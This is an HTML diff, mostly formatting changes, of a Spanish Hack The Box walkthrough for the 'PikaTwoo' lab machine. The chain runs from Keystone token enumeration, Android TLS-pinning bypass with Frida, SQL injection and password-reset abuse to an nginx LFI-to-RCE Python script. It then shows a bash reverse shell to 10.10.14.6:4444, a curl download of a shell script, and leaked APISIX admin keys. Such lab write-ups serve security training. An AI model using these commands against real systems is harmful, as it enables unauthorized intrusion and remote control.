@@ -81,7 +81,6 @@
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -90,7 +89,6 @@
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -169,7 +167,7 @@
 <li><a href="#privesc">Escalada de privilegios</a></li>
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
-<p>Primero que todo vamos a empezar con el escaneo básico de nmap</p>
+<p>Primero que todo vamos a empezar con el escaneo básico de <code>nmap</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oN allPorts2 10.10.11.199
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -326,29 +324,29 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Thu Oct 12 19:04:48 2023 -- 1 IP address (1 host up) scanned in 160.88 seconds</span>
-</span></span></code></pre></div><p>Podemos ver que tiene un par de subdominios, los cuales voy a añadir al /etc/hots</p>
+</span></span></code></pre></div><p>Podemos ver que tiene un par de subdominios, los cuales voy a añadir al <code>/etc/hots</code></p>
 <p><img src="/htb/PikaTwoo/images/1.png" alt="Pika"></p>
 <p>Si hacemos un reconocimiento de directorios podremos ver alguna cosa interesante.</p>
 <p><img src="/htb/PikaTwoo/images/2.png" alt="Pika"></p>
-<p>Podemos también hacer un reconocimiento del puerto 8080, en el cual encontraremos un /info, que tendrá esta información</p>
+<p>Podemos también hacer un reconocimiento del puerto <code>8080</code>, en el cual encontraremos un /info, que tendrá esta información</p>
 <p><img src="/htb/PikaTwoo/images/3.png" alt="Pika"></p>
 <p>Si nos metemos a la pagina principal, podemos clicar en uno de los monstruos</p>
 <p><img src="/htb/PikaTwoo/images/4.png" alt="Pika"></p>
 <p>Pero si entramos nos encontramos con este error:</p>
 <p><img src="/htb/PikaTwoo/images/5.png" alt="Pika"></p>
-<p>Si usamos Dustbuster para listar los directorios de la pagina principal, en donde encontraremos un CANGELOG, que si nos lo descargamos veremos esto:</p>
+<p>Si usamos Dustbuster para listar los directorios de la pagina principal, en donde encontraremos un <code>CANGELOG</code>, que si nos lo descargamos veremos esto:</p>
 <p><img src="/htb/PikaTwoo/images/6.png" alt="Pika"></p>
-<p>Con esto podemos ver que tiene una aplicación en android en beta</p>
+<p>Con esto podemos ver que tiene una aplicación en <code>android</code> en beta</p>
 <h2 id="Keystone">Explotación del Keystone</h2>
-<p>Bien, una vez que hemos reunido esta información podemos ir a comprobar para que sirve el puerto 5000, que normalmente se usa para el servicio Keystone</p>
+<p>Bien, una vez que hemos reunido esta información podemos ir a comprobar para que sirve el puerto <code>5000</code>, que normalmente se usa para el servicio <code>Keystone</code></p>
 <p>Fuente &ndash;&gt; <a href="https://docs.openstack.org/install-guide/firewalls-default-ports.html">https://docs.openstack.org/install-guide/firewalls-default-ports.html</a></p>
 <p>Si indagamos en este servicio veremos que tiene una vulnerabilidad que nos puede ser de utilidad</p>
 <p>CVE &ndash;&gt; <a href="https://bugs.launchpad.net/keystone/+bug/1688137">https://bugs.launchpad.net/keystone/+bug/1688137</a></p>
-<p>Esto nos dice que si mandamos peticiones por post a /v3/auth/tokens con esa data podemos conseguir la token del usuario, para esto hay que mandar varias peticiones, por lo cual vamos hacernos un script en bash que nos automatize este proceso:</p>
+<p>Esto nos dice que si mandamos peticiones por post a <code>/v3/auth/tokens</code> con esa data podemos conseguir la token del usuario, para esto hay que mandar varias peticiones, por lo cual vamos hacernos un script en bash que nos automatize este proceso:</p>
 <p><img src="/htb/PikaTwoo/images/7.png" alt="Pika"></p>
-<p>Cuando lo ejecutemos veremos que en uno de los errores esta el token del usuario admin (recordando que en el script hemos puesto que de usuario sea el admin)</p>
+<p>Cuando lo ejecutemos veremos que en uno de los errores esta el token del usuario admin (recordando que en el script hemos puesto que de usuario sea el <code>admin</code>)</p>
 <p><img src="/htb/PikaTwoo/images/8.png" alt="Pika"></p>
-<p>Ahora que tenemos el id del usuario admin podemos usar ffuf para ver si hay mas usuarios, para esto usaremos una secuencia del 1 al 10 que definiremos en <strong>F1</strong> y como <strong>F2</strong> pondremos la lista de nombres a probar, en mi caso usare una lista de SecLists</p>
+<p>Ahora que tenemos el id del usuario admin podemos usar ffuf para ver si hay mas usuarios, para esto usaremos una secuencia del 1 al 10 que definiremos en F<code>1</code> y como <code>F2</code> pondremos la lista de nombres a probar, en mi caso usare una lista de <code>SecLists</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ./ffuf -u http://10.10.11.199:5000/v3/auth/tokens -H <span style="color:#e6db74">&#34;Content-type: application/json&#34;</span> -w &lt;<span style="color:#f92672">(</span>seq <span style="color:#ae81ff">0</span> 10<span style="color:#f92672">)</span>:F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d <span style="color:#e6db74">&#39;{ &#34;auth&#34;: {&#34;identity&#34;: {&#34;methods&#34;: [&#34;password&#34;], &#34;password&#34;: {&#34;user&#34;: { &#34;name&#34;: &#34;F2&#34;,&#34;domain&#34;: { &#34;id&#34;: &#34;default&#34; },&#34;password&#34;: &#34;fake_passwordF1&#34; } } } } }&#39;</span> -ac
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -414,22 +412,22 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5471ms<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">6</span>
 </span></span><span style="display:flex;"><span>    * F2: andrew
-</span></span></code></pre></div><p>Encontramos que hay un usuario llamado Andrew también.</p>
-<p>Si nos ponemos a investigar en la pagina oficial veremos que este servicio suele usar un proxy llamado swift, en el cual podemos usar el usuario que hemos conseguido</p>
+</span></span></code></pre></div><p>Encontramos que hay un usuario llamado <code>Andrew</code> también.</p>
+<p>Si nos ponemos a investigar en la pagina oficial veremos que este servicio suele usar un proxy llamado <code>swift</code>, en el cual podemos usar el usuario que hemos conseguido</p>
 <p><img src="/htb/PikaTwoo/images/9.png" alt="Pika"></p>
 <p>Probamos a hacer un curl a esta dirección y veremos que existe pero que no podemos acceder, esto nos deja saber que este directorio existe</p>
 <p><img src="/htb/PikaTwoo/images/10.png" alt="Pika"></p>
-<p>Viendo que ese directorio existe, podemos probar a listar los directorios de esta nueva ruta, a ver si tenemos algo interesante, por lo que voy a usar la herramienta Feroxbuster</p>
+<p>Viendo que ese directorio existe, podemos probar a listar los directorios de esta nueva ruta, a ver si tenemos algo interesante, por lo que voy a usar la herramienta <code>Feroxbuster</code></p>
 <p><img src="/htb/PikaTwoo/images/11.png" alt="Pika"></p>
 <h2 id="Descarga_app">Descarga de la app</h2>
-<p>Perfecto tenemos un /android, que junto a la información del CHANGELOG que hemos visto antes nos da la idea de que por ahí puede ir la explotación, si entramos a esta pagina veremos esto:</p>
+<p>Perfecto tenemos un /android, que junto a la información del <code>CHANGELOG</code> que hemos visto antes nos da la idea de que por ahí puede ir la explotación, si entramos a esta pagina veremos esto:</p>
 <p><img src="/htb/PikaTwoo/images/12.png" alt="Pika"></p>
 <p>Podemos descargarnos la apk con un wget</p>
 <p><img src="/htb/PikaTwoo/images/13.png" alt="Pika"></p>
-<p>Ahora que tenemos la apk en nuestro equipo</p>
+<p>Ahora que tenemos la <code>apk</code> en nuestro equipo</p>
 <p>podemos debugearla con este comando, para ver los archivos internos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apktool d pokatmon-app.apk
-</span></span></code></pre></div><p>Con esto conseguiremos una carpeta con los archivos internos de la app, ahora podemos virtualizar el android, para probar la apk</p>
+</span></span></code></pre></div><p>Con esto conseguiremos una carpeta con los archivos internos de la app, ahora podemos <code>virtualizar</code> el android, para probar la apk</p>
 <p>Para esto usaremos Genymotion</p>
 <p><img src="/htb/PikaTwoo/images/14.png" alt="Pika"></p>
 <p>En mi caso ya tengo creado el móvil a virtualizar, pero para crearlo es simplemente darle al + y dejar todo por defecto, una vez que tengamos el Android corriendo podemos simplemente arrastrar el apk en el android para pasarle la apk</p>
@@ -437,21 +435,21 @@
 <p>Ahora si ejecutamos la app veremos algo interesante, nos pide un correo y un código, los cuales no tenemos</p>
 <p><img src="/htb/PikaTwoo/images/16.png" alt="Pika"></p>
 <h2 id="Reconocimiento_app">Reconocimiento de la app</h2>
-<p>Ya que todo esto esta corriendo en local podemos probar interceptando la peticion con Wireshark, veremos a donde esta tratando de mandar la solicitud (api.pokatmon-app.htb)</p>
+<p>Ya que todo esto esta corriendo en local podemos probar interceptando la peticion con Wireshark, veremos a donde esta tratando de mandar la solicitud (<code>api.pokatmon-app.htb</code>)</p>
 <p><img src="/htb/PikaTwoo/images/17.png" alt="Pika"></p>
-<p>Siendo ese el caso podemos intentar que nos mande a nosotros la peticion, modificando el /etc/hosts del android, para eso primero nos conectamos con abd, para tener una consola del movil</p>
+<p>Siendo ese el caso podemos intentar que nos mande a nosotros la peticion, modificando el <code>/etc/hosts</code> del android, para eso primero nos conectamos con abd, para tener una consola del movil</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell
 </span></span></code></pre></div><p>Ahora usamos este comando</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount -o remount,rw /
 </span></span></code></pre></div><p>Y modificamos el /etc/hosts con nuestra ip</p>
 <p><img src="/htb/PikaTwoo/images/18.png" alt="Pika"></p>
-<p>como ahora la peticion sera hacia nosotros, podemos interceptarla con burpsuite, creamos un proxy que escuche por el puerto 8443 (no me dejaba por el 443) y que como destino lleve al puerto 443 de la maquina de htb</p>
+<p>como ahora la peticion sera hacia nosotros, podemos interceptarla con burpsuite, creamos un proxy que escuche por el puerto <code>8443</code> (no me dejaba por el <code>443</code>) y que como destino lleve al puerto <code>443</code> de la maquina de htb</p>
 <p><img src="/htb/PikaTwoo/images/19.png" alt="Pika"></p>
-<p>Y ahora redirigimos todas las peticiones que nos lleguen en el puerto 443 al 8443 para que pase por burpsuite, lo hacemos con este comando</p>
+<p>Y ahora redirigimos todas las peticiones que nos lleguen en el puerto <code>443</code> al <code>8443</code> para que pase por burpsuite, lo hacemos con este comando</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:8443
 </span></span></code></pre></div><p>Una vez tenemos todo esto, podemos ver que si enviamos la peticion en el android, no nos llega en el burpsuite, esto es debido a que la peticion usa un certificado ssl que nosotros no tenemos, pero como esta aplicación esta corriendo en local, esta usando unos certificados ssl que tiene guardados dentro de la app, por lo que podemos usar frida para buscarlos</p>
 <h2 id="SSL">Bypass del certificado SSL con Frida</h2>
-<p>Para esto nos descargamos la version de frida &ndash;&gt; <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> (hay que descargar frida-server-16.1.4-android-x86_64)</p>
+<p>Para esto nos descargamos la version de <code>frida</code> &ndash;&gt; <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> (hay que descargar frida-server-16.1.4-android-x86_64)</p>
 <p>Lo descomprimimos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z X frida-server-16.1.4-android-x86_64.xz
 </span></span></code></pre></div><p>Y le cambiamos el nombre</p>
@@ -460,20 +458,20 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb push frida-server /data/local/tmp/
 </span></span></code></pre></div><p>Vamos a hacerlo ejecutable</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell <span style="color:#e6db74">&#34;chmod 755 /data/local/tmp/frida-server&#34;</span>
-</span></span></code></pre></div><p>Y finalmente lo ejecutamos</p>
+</span></span></code></pre></div><p>Y finalmente lo <code>ejecutamos</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell <span style="color:#e6db74">&#34;/data/local/tmp/frida-server &amp;&#34;</span>
 </span></span></code></pre></div><p>Si todo esto esta bien hecho, podremos ejecutar este comando (dejando en segundo plano el anterior comando)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>frida-ps -U
-</span></span></code></pre></div><p>Ahora podemos ver todos los procesos que esta corriendo el móvil, con esto hecho podemos empezar a bypasear el ssl, para esto usaremos este script de frida</p>
+</span></span></code></pre></div><p>Ahora podemos ver todos los procesos que esta corriendo el móvil, con esto hecho podemos empezar a bypasear el <code>ssl</code>, para esto usaremos este script de frida</p>
 <p>GitHub del script &ndash;&gt; <a href="https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js">https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js</a></p>
 <p>Creamos un archivo .js en nuestro equipo con el contenido del script</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nvim flutter-disable-tls.js
-</span></span></code></pre></div><p>Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado ssl</p>
+</span></span></code></pre></div><p>Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado <code>ssl</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>frida -U -l flutter-disable-tls.js -f htb.pokatmon.pokatmon_app
-</span></span></code></pre></div><p>Ahora si ponemos cualquier correo y código, podremos ver la peticion en burpsuite</p>
+</span></span></code></pre></div><p>Ahora si ponemos cualquier correo y código, podremos ver la peticion en <code>burpsuite</code></p>
 <p><img src="/htb/PikaTwoo/images/20.png" alt="Pika"></p>
 <h2 id="firma">Bypass de la firma del certificado</h2>
-<p>Esta es la peticion de burpsuite</p>
+<p>Esta es la peticion de <code>burpsuite</code></p>
 <p><img src="/htb/PikaTwoo/images/21.png" alt="Pika"></p>
 <p>Si desencriptamos la firma, veremos que no tiene nada especial, es una básica, pero cuando estuvimos viendo los archivos de la apk vimos una llave publica y una privada</p>
 <p><img src="/htb/PikaTwoo/images/22.png" alt="Pika"></p>
@@ -482,49 +480,49 @@
 </span></span></code></pre></div><p>Finalmente nos esta dando otra tipo de respuesta</p>
 <p><img src="/htb/PikaTwoo/images/23.png" alt="Pika"></p>
 <h2 id="SQLI">SQLI al loggin de la app</h2>
-<p>Ahora podemos intentar una inyección SQL (todo lo que cambies en el mensaje se tiene que firmar otra vez)</p>
+<p>Ahora podemos intentar una inyección <code>SQL</code> (todo lo que cambies en el mensaje se tiene que firmar otra vez)</p>
 <p><img src="/htb/PikaTwoo/images/24.png" alt="Pika"></p>
-<p>Y nos da un email y un código!, si lo introducimos nos dara un error</p>
+<p>Y nos da un email y un código!, si lo introducimos nos dara un <code>error</code></p>
 <p><img src="/htb/PikaTwoo/images/25.png" alt="Pika"></p>
 <p>Para solucionar esto tenemos que modificar el /etc/hosts de el android</p>
 <p><img src="/htb/PikaTwoo/images/26.png" alt="Pika"></p>
 <p>Ahora si introducimos las credenciales, nos entrara a la app</p>
 <p><img src="/htb/PikaTwoo/images/27.png" alt="Pika"></p>
 <h2 id="APISIX">Explotación de APISIX para conseguir la contraseña</h2>
-<p>Aquí no tenemos nada, pero tenemos un correo, en la pagina principal había un apartado para recuperar la contraseña a traes del correo, si ponemos el correo y interceptamos al peticion con burpsuite, veremos que nos manda a un forbidden</p>
+<p>Aquí no tenemos nada, pero tenemos un correo, en la pagina principal había un apartado para recuperar la contraseña a traes del correo, si ponemos el correo y interceptamos al peticion con burpsuite, veremos que nos manda a un <code>forbidden</code></p>
 <p><img src="/htb/PikaTwoo/images/28.png" alt="Pika"></p>
 <p>Si modificamos un poco la peticion, veremos que nos da un token</p>
 <p><img src="/htb/PikaTwoo/images/29.png" alt="Pika"></p>
-<p>Aunque aquí no podemos hacer nada, hay que recordar que tenemos el puerto 443 al que no podemos acceder, y si vemos los escaneos de nmap veremos que usa la version de APISIX/2.10.1</p>
+<p>Aunque aquí no podemos hacer nada, hay que recordar que tenemos el puerto 443 al que no podemos acceder, y si vemos los escaneos de nmap veremos que usa la version de <code>APISIX/2.10.1</code></p>
 <p><img src="/htb/PikaTwoo/images/30.png" alt="Pika"></p>
-<p>Esta version tiene varias vulnerabilidades, una de ellas nos permite saltarnos la autenticacion de la API</p>
+<p>Esta version tiene varias vulnerabilidades, una de ellas nos permite saltarnos la autenticacion de la <code>API</code></p>
 <p>CVE &ndash;&gt; <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45232">https://nvd.nist.gov/vuln/detail/CVE-2021-45232</a></p>
-<p>Probando otras cosas vemos que si hacemos un freoxbuster al https de la pagina principal, nos da varios códigos de estado 403 para todo lo que contenga private</p>
+<p>Probando otras cosas vemos que si hacemos un <code>freoxbuster</code> al https de la pagina principal, nos da varios códigos de estado <code>403</code> para todo lo que contenga private</p>
 <p><img src="/htb/PikaTwoo/images/31.png" alt="Pika"></p>
 <p>Podemos probar a hacer un curl, pero veremos que no tenemos acceso</p>
 <p><img src="/htb/PikaTwoo/images/32.png" alt="Pika"></p>
-<p>si hacemos otro feroxbuster dentro del directorio /private nos encontraremos algo bastante interesante (urlencodeando e ultimo carácter para que no nos lo bloquee)</p>
+<p>si hacemos otro feroxbuster dentro del directorio <code>/private</code> nos encontraremos algo bastante interesante (urlencodeando e ultimo carácter para que no nos lo bloquee)</p>
 <p><img src="/htb/PikaTwoo/images/33.png" alt="Pika"></p>
 <h2 id="Password_Reset">Abuso del apartado Password Reset</h2>
 <p>Podemos acceder al /password-reset, desde burpsuite accedemos a este directorio, pero veremos el siguiente mensaje</p>
 <p><img src="/htb/PikaTwoo/images/34.png" alt="Pika"></p>
 <p>Si modificamos la peticion introduciendo el email, nos dará un token, muy parecido al que nos daba al intentar recuperar la contraseña.</p>
 <p><img src="/htb/PikaTwoo/images/35.png" alt="Pika"></p>
-<p>Si introducimos ese token en la peticion pasada a POST y le introducimos el token y la new password conseguiremos cambiarla al fin</p>
+<p>Si introducimos ese token en la peticion pasada a <code>POST</code> y le introducimos el token y la new password conseguiremos cambiarla al fin</p>
 <p><img src="/htb/PikaTwoo/images/36.png" alt="Pika"></p>
 <p>Ahora si nos logreamos con la nueva contraseña tendremos acceso a este panel</p>
 <p><img src="/htb/PikaTwoo/images/37.png" alt="Pika"></p>
 <p>Si interceptamos la primera peticion veremos esto:</p>
 <p><img src="/htb/PikaTwoo/images/38.png" alt="Pika"></p>
-<p>Si le añadimos el debug nos dará otro tipo de error</p>
+<p>Si le añadimos el <code>debug</code> nos dará otro tipo de error</p>
 <p><img src="/htb/PikaTwoo/images/39.png" alt="Pika"></p>
 <h2 id="LFI">Explotación del LFI</h2>
-<p>Según este post, es posible hacer un LFI</p>
+<p>Según este post, es posible hacer un <code>LFI</code></p>
 <p>CVE &ndash;&gt; <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/</a></p>
 <p>La peticion seria la siguiente:</p>
 <p><img src="/htb/PikaTwoo/images/40.png" alt="Pika"></p>
 <h2 id="RCE">Paso de LFI a RCE usando nginx</h2>
-<p>Si buscamos por internet veremos que hay una manera de pasar el LFI a un RCE a través de nginx</p>
+<p>Si buscamos por internet veremos que hay una manera de pasar el <code>LFI</code> a un <code>RCE</code> a través de nginx</p>
 <p>Post &ndash;&gt; <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/</a></p>
 <p>Si usamos este script, seremos capaces de ejecutar comandos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
@@ -593,13 +591,13 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> nginx_workers:
 </span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>bruter, args<span style="color:#f92672">=</span>(pid, ))
 </span></span><span style="display:flex;"><span>    a<span style="color:#f92672">.</span>start()
-</span></span></code></pre></div><p>Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una reverse shell a nuestro equipo</p>
+</span></span></code></pre></div><p>Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una <code>reverse shell</code> a nuestro equipo</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Usamos el script para que nos haga una peticion a nuestro servidor http y que se descargue este archivo en el directorio /tmp</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 10.10.14.6:8080/shell -o /tmp/shell
-</span></span></code></pre></div><p>Después ejecutamos el script una vez mas, pero con el comando para ejecutar la shell (y nos ponemos en escucha por el puerto 4444)</p>
+</span></span></code></pre></div><p>Después ejecutamos el script una vez mas, pero con el comando para ejecutar la shell (y nos ponemos en escucha por el puerto <code>4444</code>)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash /tmp/shell
 </span></span></code></pre></div><p>Con esto tendremos acceso al usuario www</p>
 <p><img src="/htb/PikaTwoo/images/41.png" alt="Pika"></p>
@@ -607,10 +605,10 @@
 <p><img src="/htb/PikaTwoo/images/42.png" alt="Pika"></p>
 <p>Si nos metemos en el /sun/secrets veremos que tiene un kubernetes.io por lo que esta maquina esta corriendo kubernetes</p>
 <p><img src="/htb/PikaTwoo/images/43.png" alt="Pika"></p>
-<p>También nos encontramos un token</p>
+<p>También nos encontramos un <code>token</code></p>
 <p><img src="/htb/PikaTwoo/images/44.png" alt="Pika"></p>
 <h2 id="Kubernetes">Explotacion de Kubernetes y APISIX para salir del contenedor</h2>
-<p>Buscando sobre kubernetes me encontré este post, en el cual nos dice como bypasear la autenticacion del API de kubernetes</p>
+<p>Buscando sobre kubernetes me encontré este post, en el cual nos dice como bypasear la autenticacion del API de <code>kubernetes</code></p>
 <p>POST &ndash;&gt; <a href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/</a></p>
 <p>Por lo cual ejecutare estos comandos:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>APISERVER<span style="color:#f92672">=</span>https://kubernetes.default.svc
@@ -638,9 +636,9 @@
 </span></span></code></pre></div><p>Esto nos dará dos keys</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;APISIX_ADMIN_KEY&#34;</span>: <span style="color:#e6db74">&#34;YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=&#34;</span>,
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;APISIX_VIEWER_KEY&#34;</span>: <span style="color:#e6db74">&#34;OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg=&#34;</span>
-</span></span></code></pre></div><p>Gracias a todo esto, y a esta vulnerabilidad del APISIX, seremos capaces de ejecutar comandos</p>
+</span></span></code></pre></div><p>Gracias a todo esto, y a esta vulnerabilidad del <code>APISIX</code>, seremos capaces de ejecutar comandos</p>
 <p>CVE &ndash;&gt; <a href="https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/">https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/</a></p>
-<p>Nos pasamos el chisel a la maquina victima y ejecutamos este comando en nuestra maquina (este proceso que vamos a hacer ahora es para poder ver la peticion en burpsuite, te lo puedes saltar si lo hacer solo con curl)</p>
+<p>Nos pasamos el chisel a la maquina victima y ejecutamos este comando en nuestra maquina (este proceso que vamos a hacer ahora es para poder ver la peticion en <code>burpsuite</code>, te lo puedes saltar si lo hacer solo con curl)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse --port <span style="color:#ae81ff">8081</span>
 </span></span></code></pre></div><p>ahora comprobamos que el puerto 9080 sea el de apisix-admin</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl apisix-admin:9080 -v
@@ -668,23 +666,23 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl localhost:9080
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;error_msg&#34;</span>:<span style="color:#e6db74">&#34;404 Route Not Found&#34;</span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>Todo esto es para poder usar el burpsuite, y que sea mas fácil mandar la peticion para el RCE, ahora desde burpsuite vamos a andar una peticion basada en esta pagina</p>
+</span></span></code></pre></div><p>Todo esto es para poder usar el burpsuite, y que sea mas fácil mandar la peticion para el <code>RCE</code>, ahora desde burpsuite vamos a andar una peticion basada en esta pagina</p>
 <p>Pagina &ndash;&gt; <a href="https://apisix.apache.org/docs/apisix/plugins/batch-requests/">https://apisix.apache.org/docs/apisix/plugins/batch-requests/</a></p>
 <p>Vamos a usar esto para crear un archivo que contenga una reverse shell, para conectarnos con la maquina principal, la peticion seria esta:</p>
 <p><img src="/htb/PikaTwoo/images/45.png" alt="Pika"></p>
 <p>Ahora hacemos un curl a esta nueva pagina que hemos creado, y nos ponemos en escucha, para verificar si nos hace una peticion</p>
 <p><img src="/htb/PikaTwoo/images/46.png" alt="Pika"></p>
-<p>Y recibimos la peticion, perfecto ahora podemos empezar a crear la peticion para la reverse shell, para esto usaremos un comando filter, el cual nos dejara ejecutar comandos en lua, para posteriormente indicarle de ejecutarlos en shell</p>
+<p>Y recibimos la peticion, perfecto ahora podemos empezar a crear la peticion para la reverse shell, para esto usaremos un comando filter, el cual nos dejara ejecutar comandos en <code>lua</code>, para posteriormente indicarle de ejecutarlos en shell</p>
 <p><img src="/htb/PikaTwoo/images/47.png" alt="Pika"></p>
 <p>Una vez creada nos ponemos por escucha y le hacemos un curl a esta nueva pagina</p>
 <p><img src="/htb/PikaTwoo/images/48.png" alt="Pika"></p>
